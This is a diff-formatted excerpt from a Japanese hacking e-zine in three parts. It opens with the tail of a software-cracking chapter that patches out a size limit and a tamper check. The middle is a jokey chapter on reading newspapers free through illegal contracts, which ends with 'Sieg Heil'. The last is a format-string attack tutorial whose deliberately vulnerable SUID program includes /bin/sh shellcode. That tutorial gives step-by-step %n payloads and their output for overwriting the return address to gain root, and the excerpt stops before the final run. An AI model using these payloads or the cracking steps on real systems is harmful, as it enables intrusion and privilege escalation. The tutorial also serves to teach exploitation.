+004CC02B    64:890D 0000000>MOV DWORD PTR FS:[0],ECX
+004CC032    BB 07000000     MOV EBX,7
+004CC037    8B0D F8C25000   MOV ECX,DWORD PTR DS:[50C2F8]
+004CC03D    8999 78020000   MOV DWORD PTR DS:[ECX+278],EBX
+004CC043  ^ E9 29EDF3FF     JMP perfect_.0040AD71
+-----
+
+　実行させると確かにサイズが7GBになっているのが確認できるでしょう。後はこ
+れを外部から変更するソフトを作れば終わりです。今回のパッチ＆変更ソフトは
+私のサイトで公開しています。
+
+http://security.symphonic-net.com/?page_id=6
+
+　お疲れ様でした。
+
+
+■0x06.) さいごに
+
+　今回の解析では40GB制限と改変チェックの回避を行いましたが、他にも色々と
+いじれるところはあると思うので、興味ある方は他にも解析してみるのもいいか
+もしれません。頑張ってください。
+　取り敢えず改変チェックは回避しているので解析しやすいかと思います。文章
+だけではちょっと分かりにくいと思うので、後日画像を含めたものをうちのサイ
+ト↓で公開しようと思います。ではでは。
+
+Security Ark
+http://security.symphonic-net.com/
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第3章: 新聞勧誘員撃退のお呪い ---
+
+著者：理事長
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　Guten Tag !
+　Wie geht es Ihnen ?
+
+　ちょくちょく、EPSILON殿 Wizard Bibleで原稿を執筆させていただいておりま
+す、宗凶法人愛連合中央執行委員会執行統括理事長Rudolph von Gartheimerでご
+ざいます。え？　名前が長い？　でも、ドイツ語だと、Der vollstreckende Vor
+sitzender des zentralen Exekutivkomiteesになってしまうのでもっと長くなり
+ます……｡
+
+　さて、今回は新聞を無料で読む方法を……。
+　え？　知ってる？
+
+……。
+
+……えー、その。そうするとネタがいきなり消滅（髪も）するので、読んでやっ
+てください。お願いします。今でも通用するネタなので、いや、ホントに。
+
+
+■0x02.) 新聞勧誘の実態
+
+　新聞は既に時代遅れのメディアになりつつあり、購読している世帯が激減して
+いる模様です。大変なのは新聞勧誘員のオジサン達。
+
+　なにしろノルマを達成できないと、悲惨なお仕置きが待っているのです。三角
+木馬に鞭やロウソクは基本、否、それ以上の恐怖のお仕置きが……。
+
+　さて、ノルマを達成しないとお仕置きが待っているオジサンたちはあらゆる手
+段で契約を迫ってきます。我が家は学生アパートの一角に紛れ込んでいるので、
+学生を狙った新聞勧誘員のオジサンが我が家のベルをウッカリ鳴らすと、地雷を
+踏んだも同然です。以前、宗教勧誘の人が来ましたが、理事官邸の玄関には旧ソ
+連の旗が飾ってあるので、彼らはドアを開けた瞬間に無言で去っていきました。
+なかなか便利ですが、共産主義者と誤解される恐れがあるので、世間体を気にす
+る人は止めましょう。
+
+　他にも浄水器の勧誘が来ましたが、我が家は例によってドアを開けた瞬間、実
+験器具の山が並んでいる上、純水製造装置があるので、見ただけで帰って行きま
+した。もっと面白い来客はいないのでしょうか、ワタクシは寂しくてしかたあり
+ません。
+
+　話を戻して本題に入りますが、新聞勧誘のオジサン達が来た場合は以下の呪文
+を唱えるだけで、退散していくか、新聞が無料で読めてしまいます。
+
+「置き勧なら良いですよ。」
+
+　これでオジサンたちは帰っていくか、現金を置いていって新聞を無料で読める
+ことになります。どうして、こんなことが可能なのでしょうか？
+
+　新聞の契約は大抵、三ヶ月で一万円前後ですが、一世帯あたりの契約成立報酬
+料、もしくは勧誘ノルマを達成した場合は、一万円以上の報酬が出るため（ノル
+マを達成するとボーナスも出る）、オジサン達にとっては契約数がイノチなので
+す。
+　なので、新聞を無料で読めるワタシもシアワセ、オジサンもノルマを達成でき
+てハッピーワタシもアナタもウレシイグンニュースグンニュースモーマンタイ（
+注：無問題）な訳なのです。
+
+　が、実はこの契約方法は独占禁止法第十九条（不公正な取引の禁止）違反、景
+品表示法第三条（景品類の制限及び禁止）違反、さらに「新聞業における景品類
+の提供に関する事項の制限」（平成12年公正取引委員会告示第29号。「新聞業景
+品制限告示」と呼ぶ）と色々規制されており、オジサンたちはこの事がバレると
+即効で首になります。
+
+　ナニ、心配は要りません、処分されるのは勧誘員のオジサンだけで契約者には
+処分はありません。五年間、新聞をタダで読み続けているワタシが言うのですか
+ら、間違いありません。
+
+　ただ、ここで一応注意しておきたいのは、口頭では置き勧は成立しないので必
+ず、契約書に「購読料領収済み」と勧誘員のオジサンに一筆入れてもらいましょ
+う。あとは販売店から確認の電話が架かってきますが、適当に済ませます。
+
+　ワタシの場合は後から来る集金の人が面倒なのでオジサンに全部処理を任せて
+あるので、集金も来ません。ただ新聞の契約書にサインしてハンコ押して、一筆
+「購読料領収済み」入れてもらってそれで終わりです。
+
+　あとはオジサンから洗剤貰うなり、ビール券貰うなりしましょう。ただ、洗剤
+やビール券などの景品は全部オジサン達の自腹なのであんまり欲張らないよう。
+契約が成り立ってもビール券などが減っていないと販売店の監査に引っかかると
+言われて、ビール券を毎回置いていく某朝目新聞のオジサンもいますが、ホント
+ウにこの業界は色々厳しい模様です。
+
+　この調子でワタシは朝目新聞と読瓜新聞を五年間、無料で契約してます（最近
+は毎目も）。新聞三誌もとっていると読むのも大変で邪魔ですが（朝目などの売
+国新聞はそのままゴミ箱行きがおおいですが）。
+
+　新聞は読まないので、朝に投函されたら、そのまま我が連合理事官邸のペット
+で緊急時における「非常食」のウサギの「メンチ（雄）」のトイレの敷材になっ
+てます。後はビルマニシキヘビ、ボアコンストリクター等の大蛇の敷材にも便利
+です。
+
+　トイレットペーパーにならないのが不便ですね。それでも大量にあって邪魔で
+仕方ないので、硝酸で硝化してみると良いかもしれません。
+
+　まぁ、オトナの事情で硝化してどうするのかは読者の皆様のご想像にお任せし
+ます。
+　新聞勧誘でうんざりしていたり、ご家庭の経済的負担をすこしでも減らす事が
+出来れば愛連合の長として嬉しいことはありません。
+
+
+■0x03.) 最後に
+
+　皆様も新聞勧誘員が来たら、勇気を持って「置き勧」で、と一言言ってみまし
+ょう。必ず退散するか、新聞をタダで読めてしまいます。
+
+　是非おためしあれ。
+
+　それではAuf Wiedersehen!！ Sieg Heil!!
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第4章: はじめてのハッキング　～フォーマットストリング攻撃2～ ---
+
+著者：Defolos
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回は任意メモリ番地のメモリ内容を出力する方法を解説しました。今回はフ
+ォーマットストリング攻撃の真骨頂である、任意メモリ番地の任意書き換えを解
+説します。
+
+
+■0x02.) 書き込み変換指定文字
+
+　通常、変換指定文字は出力する形式を指定するものですが、少し毛色の違う変
+換指定文字も存在します。それが「%n」という変換指定文字です。%nは、その関
+数内でそれまでに出力された文字数を、対応する引数の変数に格納します。つま
+り、メモリ内への書き込みが可能な変換指定文字なのです。
+
+●%nの実際の動き
+
+　%nの実際の動きは、次のようなコードで確認できます。このコードはprintf()
+で"Hello World!"という文字列を出力し、その後%nで出力した文字数をtestとい
+う変数に格納しています。
+
+-----　test.c
+#include <stdio.h>
+
+int main(int argc, char *argv[]){
+
+    int test;
+    printf("Hello World!%n\n", &test);
+    printf("%d\n", test);
+
+    return 0;
+}
+-----
+
+　%nは指定されたアドレスに値を格納するので、printf()への第2引数にはアドレ
+スを示す&を付与しなければなりません。これをコンパイルし実行すると次のよう
+な結果が得られます。
+
+-----
+defolos@Glazheim:~/Desktop$ gcc -Wall test.c
+defolos@Glazheim:~/Desktop$ ./a.out 
+Hello World!
+12
+-----
+
+　「Hello World!」は12文字ですので、testの中には12が格納されます。つまり、
+%nはそれまでに出力したバイト数を書き込むのです。これをうまく利用すれば、
+任意の値を書き込むことが可能となります。
+
+
+■0x03.) 変数の書き換え
+
+　では実際に、変数の中身を書き換えてみます。次のコードはゲームプログラム
+の骨格です。ゲームをはじめるにあたって、コマンドライン引数でユーザ名を指
+定します。最後にユーザ名とスコアを表示します。今回はゲームルーチンが存在
+しないので、スコアは常に0になるはずです。
+
+-----　game.c
+#include <stdio.h>
+
+int main(int argc, char *argv[]){
+
+    int score;
+    char payload[]=
+        "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
+        "\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
+        "\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
+        "\x68";
+
+    char name[150];
+    int starge;
+
+    starge = 1;
+    score = 0;
+
+    printf("[debug]addr of score = %x\n", &score);
+    printf("[debug]addr of payload = %x\n", &payload[0]);
+
+    strcpy(name, argv[1]);
+
+    //game routine
+
+    printf("Score of ");
+    printf(name);
+    printf(" is %d(%x)!!\n", score, score);
+
+    return 0;
+}
+-----
+
+　このコードをコンパイルし、実行すると次のようになります。
+
+-----
+newbie@Glazheim:knoppix$ game.exe Defolos
+[debug]addr of score = bffff9ac
+[debug]addr of payload = bffff970
+Score of Defolos is 0(0)!!
+-----
+
+　しかしながら、見てのとおり「printf(name);」の部分にフォーマットストリン
+グバグが存在しています。ここで次のように、変換指定文字を含む文字列をユー
+ザ名として与えるとメモリ内が閲覧できてしまいます。
+
+-----
+newbie@Glazheim:knoppix$ game.exe AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+[debug]addr of score = bffff98c
+[debug]addr of payload = bffff950
+Score of AAAAbffffb6b.1.bffff8c4.4d532038.532050.b7eb116c.1.41414141.252e7825.78252e78 is 0(0)!!
+-----
+
+　注目していただきたいのは「41414141」の部分です。この41の連続はフォーマ
+ットストリングの開始部分を表しているのです。このときのメモリは次のような
+レイアウトになっています。
+
+[stack]
+0x00----------------------------------------------low
+    nameへのアドレス                                   ↑
+0x04----------------------------------------------     |
+    SFP(bffffb6b)                                      |printf()
+0x08----------------------------------------------     |
+    ???(1)                                             |
+0x0c----------------------------------------------     |
+    SEIP(bffff8c4)                                     |
+0x0c----------------------------------------------     ↓
+    ????(4d532038)
+0x10----------------------------------------------
+    ????(532050)
+0x14----------------------------------------------
+    ????(b7eb116c)
+0x18----------------------------------------------      ↑
+    starge(1)                                           |
+0x1c----------------------------------------------      |
+    name[150]="AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"       |
+0xb4----------------------------------------------      |
+    payload[32]                                         |
+0xd4----------------------------------------------      |main()
+    score(0)                                            |
+0xd8----------------------------------------------      |
+    SFP                                                 |
+0xdc----------------------------------------------      |
+    SEIP                                                ↓
+0xe0----------------------------------------------high
+
+　printf()が呼び出されると、引数として渡された、フォーマットストリングの
+格納されたアドレスから順次文字列を出力していきます。ここではフォーマット
+ストリングのアドレスとしてname(0x1c)のアドレスが渡されているため、main()
+内のnameの中身を順次出力します。5文字目から変換指定文字が出現しているため、
+本来第2引数が格納されているであろう0x04のアドレスを出力します。8つ目の変
+換指定文字を出力する段階になると、第8引数が格納されているであろう場所は
+0x1cであるためnameの中身が出力されていきます。つまり、「41414141」はname
+の先頭を出力しているのです。
+
+　ここで、「AAAA」を引数として参照する8つ目の変換指定文字を%nに変えます。
+%nは対応する引数で指定されたアドレスに出力したバイト数を書き込む変換指定
+文字でした。つまり、0x41414141番地（AAAAを16進数で表示すると0x41414141）
+に51という値を書き込もうとします。しかしながら、0x41414141番地は書き込み
+が許されない領域ですのでセグメンテーションフォルトが発生します。
+
+-----
+newbie@Glazheim:knoppix$ game.exe AAAA%x.%x.%x.%x.%x.%x.%x.%n.%x.%x
+[debug]addr of score = bffff98c
+[debug]addr of payload = bffff950
+セグメンテーション違反です
+-----
+
+　0x41414141番地は書き込み不可領域でしたが、この方法を応用してscore変数の
+アドレスを書き換えることができればゲームのスコアを自由に書き換えることが
+できるのです。score変数はデバッグ情報より0xbffff98c番地に存在していること
+が確認できます。ですので、前回はAAAA(41414141)としていた部分をbffff98cに
+変更してやれば、score変数を書き換えることができます。
+
+●リトルエンディアン
+
+　アドレスを構成する場合、エンディアンを考慮しなければなりません。x86系の
+linuxではリトルエンディアンが採用されています。エンディアンは以前述べまし
+た通り、16進数の記述順序の違いです。おさらいとしてもう一度解説します。リ
+トルエンディアンの場合はbffff98cという値を構築するには、まず2桁ずつ区切り
+ます。次に一番左のブロックを一番右に書き、二番目に左のブロックをその前に
+配置します。つまり、「8c f9 ff bf」となるわけです。
+
+●perlによる出力
+
+　「8c f9 ff bf」という16進数をフォーマットストリングの最初の部分に記述す
+れば、bfffff98c番地の内容を書き換えられることがわかりました。しかし、16進
+数はキーボードから直接入力することはできません。ASCIIコードに割り振られて
+いる16進数は、かろうじて入力が可能ですが0xffや0xfaなどの16進数は入力が不
+可能です。そこで、Perlを利用してこれらの数値を入力します。
+　Perlはインタプリタ型のスクリプト言語で、コマンドライン上でも動作させる
+ことができます。C言語のprintf()のように16進数を出力することができるので、
+これを利用します。コマンドラインでPerlを利用する場合は「`printf "\x8c\xf9
+\xff\xbf"`」のように「`」で囲みます。\xが16進数であることを表すので、0x8c
+f9ffbfが出力されます。
+　以上の知識をつなぎ合わせて、score変数を書き換えてみましょう。次のような
+文字列をユーザ名として登録すればscore変数が51に書き換えられます。
+
+※下記のコードではscoreの場所がbffff99cになっていますが、これはフォーマッ
+トストリングの長さによって動的に変数の場所が確保されるためです。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x9c\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n
+[debug]addr of score = bffff99c
+[debug]addr of payload = bffff960
+Score of 鐃緒申鐃?fffb71.1.bffff8d4.4d532038.532050.b7eb116c.1. is 51(33)!! 
+-----
+
+　printf()はフォーマットストリングを順に出力し、変換指定文字が見つかれば
+本来出力すべき変数が格納されているであろう場所の内容を表示します。8つ目の
+変換指定文字はフォーマットストリング自体の場所を示すため、8つ目の変換指定
+文字に%nを指定すると、フォーマットスリングの最初の32バイト（8cf9ffbf）を
+読みます。これを総出力バイト数を格納するアドレスとして取扱います。ゆえに、
+8cf9ffbf番地に51が書き込まれます。
+　上記のコードでは8cf9ffbf番地に位置する変数の内容を書き換えましたが、ア
+ドレス指定部分を書き換えれば任意の番地に書き込みができます。このように、
+%n変換指定文字を利用すれば、任意のアドレス番地のメモリ内容を書き換えるこ
+とができます。しかし、%nはそれまでに出力した文字数を書き込むので、このま
+までは書き込める内容が決まってしまいます。任意の値を書き込むには、次に説
+明するフィールド幅オプションが必要になります。
+
+●フィールド幅オプション
+
+　フィールド幅オプションは、変換指定文字で指定されたデータを出力するに当
+たっての最小桁数を指定するものです。例えば、123という値を5桁で表示するよ
+うに指定すれば、00123のように先頭が0でパディングされます。記述方法は「%1
+00x」のように、%の後に最小桁数を記述し、それに続けて出力フォーマットを指
+定します。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x9c\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%10x.%n
+[debug]addr of score = bffff99c
+[debug]addr of payload = bffff960
+Score of 鐃緒申鐃?fffb6f.1.bffff8d4.4d532038.532050.b7eb116c. 1. is 60(3c)!!
+-----
+
+　このように、フィールド幅オプションを利用すれば、任意の値を変数に書き込
+むことができます。しかし、私たちが目指していることは、SEIP領域をペイロー
+ドが格納されたメモリ番地に書き換えてroot権限を奪取することです。フィール
+ド幅で指定できる値はさして大きくなく、アドレスのような大きな値をフィール
+ド幅に指定することはできません。ゆえに、メモリのような大きな値を書き込む
+には特別なテクニックが必要になります。
+
+
+■0x04.) 多段階書き込みテクニック
+
+　書き込み先として指定した8cf9ffbfですが、これを最下位の桁として考えた場
+合、1足した8df9ffbfというアドレスは最下位から2桁目として扱うことができま
+す。同様に、2足した8ef9ffbfは3桁目であり、8ff9ffbfは4桁目として扱えます。
+よって、bffff98c番地にaa000000を書き込み、その後にbffff98d番地にbb000000
+を書き込み、次にbffff98e番地にcc000000を、bffff98f番地にdd000000を書き込
+めば、bffff98c番地から見れば「aabbccdd」が書き込まれたことになります。
+
+--------------------------bffff98c
+aa 00 00 00
+--------------------------bffff98d
+   bb 00 00 00
+--------------------------bffff98e
+      cc 00 00 00
+--------------------------bffff98f
+         dd 00 00 00
+==========================
+aa bb cc dd
+
+　このように4つのアドレスをそれぞれの桁として扱い、任意の数値を書き込むこ
+とができます。具体的には「`printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\x
+f9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n」のように、フォーマッ
+トストリングに4つのアドレスを立て続けに書きます。初めの%nはフォーマットス
+トリングの初めの4バイトを参照し、次の%nはフォーマットストリングの4バイト目
+から7バイト目までの4バイトを参照します。
+
+　例として0xddccbbaaという値をscoreに書き込んでみましょう。リトルエンディ
+アンですので、はじめにbffff98c番地に0x000000aaを書き込みます。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n
+[debug]addr of score = bffff98c
+[debug]addr of payload = bffff950
+Score of 鐃緒申鐃緒申鐃緒申鐃緒申鐃?fffb65.1.bffff8c4.4d532038.532050.b7eb116c.1. is 63(3f)!! 
+-----
+
+　フィールド幅オプションなしの状態では63という値が書き込まれます。これを
+0xaaにするには、あとどれだけの出力を余分に行えばよいでしょうか。0xaaは10
+進数で170ですので、170-63=107。つまり、108文字を余分に出力すれば0xaaを書
+き込めます。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%108x.%n
+[debug]addr of score = bffff98c
+[debug]addr of payload = bffff950
+Score of 鐃緒申鐃緒申鐃緒申鐃緒申鐃?fffb62.1.bffff8c4.4d532038.532050.b7eb116c. 1. is 170(aa)!! 
+-----
+
+　次に、2桁目の出力を行います。2桁目はbffff98d番地に0x000000bbを書き込み
+ます。現在のところ、170(0xaa)バイトの出力ができていますが、0xbbはここから
+さらに17バイト余分に文字を出力しなくてはなりません。当然、bffff98c番地に
+aaを格納するために利用した%108xの後ろに、フィールド幅オプションを指定しな
+ければなりません。しかし、%108xの後ろにはもう変換指定文字はありません。で
+すので、「`printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\
+xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n.%x.%n.%x.%n.%x.%n」のようにひとつめ
+の%nの後ろに%xを配置し、その後ろに2桁目の%nを置きます。
+　ただし、このままでは2桁目の%nの前の%xが、本来2桁目のアドレスである\x8d
+\xf9\xff\xbfを参照してしまいます。結果として2桁目の%nは3桁目の\x8e\xf9\x
+ff\xbfを参照してしまいます。
+
+                          .-------------------------------------------------.
+  .-----------------------|---------------------------------------.         |
+ ↓                      ↓                                       |         |
+-+-----------+-----------+-----------+-----------+----+----+----+----+----+----+----
+ | bfffff98c | bfffff98d | bfffff98e | bfffff98f | %x | %x | ...| %n | %x | %n |
+-+-----------+-----------+-----------+-----------+----+----+----+----+----+----+
+            ↑                                                         |
+             ^---------------------------------------------------------^
+
+●スペーサテクニック
+
+　これを解決するために、アドレスとアドレスの間にスペーサをかませます。つ
+まり、%xが参照するためのダミーの文字列をはさみます。変換指定文字は4バイト
+を一単位とするため、適当な4文字の文字列をはさみます。よく使われるのは「J
+UNK」という文字列ですので、これに習いJUNKをはさんでみます。
+
+                          .-----------------------------------------------------------------------.
+  .-----------------------|-------------------------------------------------------------.         |
+ ↓                      ↓                                                             |         |
+-+-----------+------+-----------+------+-----------+------+-----------+----+----+----+----+----+----+--
+ | bfffff98c | JUNK | bfffff98d | JUNK | bfffff98e | JUNK | bfffff98f | %x | %x | ...| %n | %x | %n |
+-+-----------+------+-----------+------+-----------+------+-----------+----+----+----+----+----+----+--
+             ↑                                                                             |
+              ^-----------------------------------------------------------------------------^
+
+　%nの後ろの%xはJUNKを参照します。この%xにフィールド幅オプションを指定す
+れば、好きな値を2桁目に書くことができます。それでは、この方式を用いてsco
+re変数に0xddccbbaa（10進数では3721182122）を書き込んでみましょう。間にJU
+NKという文字列を入れたので、出力バイト数は以前と変化しています。よって、
+まずは何も指定しない状態でscore変数に何が格納されるか確認します。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x7c\xf9\xff\xbfJUNK\x7d\xf9\xff\xbfJUNK\x7e\xf9\xff\xbfJUNK\x7f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n
+[debug]addr of score = bffff97c
+[debug]addr of payload = bffff940
+Score of |鐃緒申UNK}鐃緒申UNK~鐃緒申UNK鐃緒申ffffb59.1.bffff8b4.4d532038.532050.b7eb116c.1. is 75(4b)!! 
+-----
+
+　どうやら75のようです。0xaaは10進数で170ですので、170-75=95。つまり、96
+を%xの幅指定オプションに指定すれば0xaaを書き込めます。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x7c\xf9\xff\xbfJUNK\x7d\xf9\xff\xbfJUNK\x7e\xf9\xff\xbfJUNK\x7f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%96x.%n
+[debug]addr of score = bffff97c
+[debug]addr of payload = bffff940
+Score of |鐃緒申UNK}鐃緒申UNK~鐃緒申UNK鐃緒申ffffb57.1.bffff8b4.4d532038.532050.b7eb116c. 1. is 170(aa)!! 
+-----
+
+　0xaaと0xbb、0xbbと0xcc、0xccと0xddの間にはそれぞれ17の違いがありますの
+で、以降は%xのフィールド幅指定には15（変換指定文字の間の.および変換指定文
+字自身を勘定して2を引いている）を指定します。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%96x.%n.%15x.%n.%15x.%n.%15x.%n
+[debug]addr of score = bffff96c
+[debug]addr of payload = bffff930
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb3f.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is -573785174(ddccbbaa)!! 
+-----
+
+　以上のように、0xddccbbaaを書き込むことができました。ここまでくれば、SE
+IPに偽の戻りアドレスを上書きするまで後一歩です。
+
+●戻りアドレスの書き込み
+
+　アドレスを書き込む場合、もうひとつ気にしなければならない項目があります。
+アドレスはよく、0x0806abcdのような値になります。0xcdの次に0xabが来ている
+ことが今回の議題です。気付いた方もいらっしゃると思いますが、フィールド幅
+オプションで指定できたのは値が増えていく場合のみです。アドレスのように引
+き算を行わなければならないときは、また別のテクニックを用います。
+
+○桁あふれによるアドレスの書き込み
+
+　加算によって減算を行うことができるというのは周知のことだとは思いますが、
+軽く触れておきます。桁が2桁しかない場合、50+67は17になります。桁を無視す
+れば50+67は117ですが、2桁であるとすれば繰り上がった桁は無視され17のみが認
+識されます。つまり、50+67は加算でありながら50から33を減算したことになりま
+す。このように桁あふれを利用すれば加算のみで減算を行うことができるのです。
+　これを応用して0x0806abcdを作ってみます。
+
+-----
+newbie@Glazheim:knoppix$ ./game.exe `printf "\x7c\xf9\xff\xbfJUNK\x7d\xf9\xff\xbfJUNK\x7e\xf9\xff\xbfJUNK\x7f\xf9\xff\xbf"`%x%x%x%x%x%x%x%n
+[debug]add of score = bffff97c
+Score of |鐃緒申UNK}鐃緒申UNK~鐃緒申UNK鐃緒申ffffbedb7eb714eb7eb1efcb7ea942cb7fe9b9010 is 75(4b)!! 
+-----
+
+　初期値は75であるとわかりました。ここからcdを作ります。0xCD=205なので205
+-75=130であり、131をフィールド幅に指定すれば良いことがわかります。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%x.%n.%x.%n.%x.%n
+[debug]addr of score = bffff96c
+[debug]addr of payload = bffff930
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb44.1.bffff8a4.4d532038.532050.b7eb116c. 1..4b4e554a..4b4e554a..4b4e554a.is -337520691(ebe1d7cd)!! 
+-----
+
+　次に、0xabを作りますが、0xcdから0xabを作らなくてはならないため、桁あふ
+れを用います。つまり、0x1AB=427であり、1AB-CD=222ですので、次のフィールド
+幅オプションには220を指定します。桁あふれが発生し、減算が可能です。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%220x.%n.%x.%n.%x.%n
+[debug]addr of score = bffff96c
+[debug]addr of payload = bffff930
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb41.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a..4b4e554a..4b4e554a. is -1078613043(bfb5abcd)!! 
+-----
+
+　次に0x06を作成しますが、これもまた桁あふれを利用しなくてはなりません。
+0x106=262、0x106-0xAB=0x5B=91ですので、フィールド幅には89を指定します。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%220x.%n.%89x.%n.%x.%n
+[debug]addr of score = bffff96c
+[debug]addr of payload = bffff930
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb3f.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a..4b4e554a. is 268872653(1006abcd)!!
+-----
+
+　最後にx08を作成します。これは一見、0x08の方が大きいので加算のみで作成で
+きそうですが、フィールド幅オプションは「最小」表示桁数であることに注意し
+てください。つまり、3桁で表示すると指定しても、データが5桁であれば5桁で表
+示されます。ゆえに、これもまた桁あふれを利用しなければなりません。x108-x06
+ = x102 = 258ですので、256を指定します。
+
+-----
+newbie@Glazheim:knoppix$ game.exe `printf "\x5c\xf9\xff\xbfJUNK\x5d\xf9\xff\xbfJUNK\x5e\xf9\xff\xbfJUNK\x5f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%220x.%n.%89x.%n.%256x.%n
+[debug]addr of score = bffff95c
+[debug]addr of payload = bffff920
+Score of \鐃緒申UNK]鐃緒申UNK^鐃緒申UNK_鐃緒申ffffb3c.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is 134654925(806abcd)!! 
+-----
+
+　以上のように、0x0806abcdを作成することができました。これでどのような値
+でも任意のメモリに書き込むことができるようになったわけです。その記念（？）
+にroot権限の奪取を実証してみましょう。
+
+
+■0x05.) root権限奪取の実証
+
+　お気づきの方もいらっしゃるでしょうが、今回のサンプルコードにはシェルコ
+ードが格納された配列が備わっています。通常、まともなプログラムにはこのよ
+うなあからさまな脆弱性はありません。シェルコードはデバッグ情報からbffff9
+20番地に存在していることが確認できます。また、main関数のSEIPの場所はbfff
+f96c番地に存在しています。つまり、bffff96c番地の中身をbffff920に書き換え
+ることができれば、main関数の終了時にpayload配列の先頭に処理が移り、シェル
+コードが起動します。
+
+●まずはscoreで試してみよう
+
+　いきなりbffff96c番地の値を書き換えるのはあまりおすすめできません。とい
+いますのも、bffff96c番地は出力されないので、本当にうまく0xbffff920が生成
+できているか確認がとれないためです。ですので、はじめは出力されるscore変数
+に0xbffff920を作ってみます。
+
+-----
+newbie@Glazheim:knoppix$ ./game.exe `printf "\x5c\xf9\xff\xbfJUNK\x5d\xf9\xff\xbfJUNK\x5e\xf9\xff\xbfJUNK\x5f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%214x.%n.%215x.%n.%260x.%n.%190x.%n
+[debug]addr of score = bffff95c
+[debug]addr of payload = bffff920
+Score of \鐃緒申UNK]鐃緒申UNK^鐃緒申UNK_鐃緒申ffffb3b.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is -1073743584(bffff920)!! 
+-----
+
+　0xbffff920の生成手順は先述の通り、桁あふれを利用して生成します。score内
+に正常に生成できていることが確認できました。
+
+●権限奪取
+
+　それでは、bffff96c番地を0xbffff920に書き換えてみましょう。先ほどの入力
+のうち、アドレス部分を書き換えればOKです。game.exeはSUIDビットが立ってい
+て、所有者がrootになっています。
+
+-----
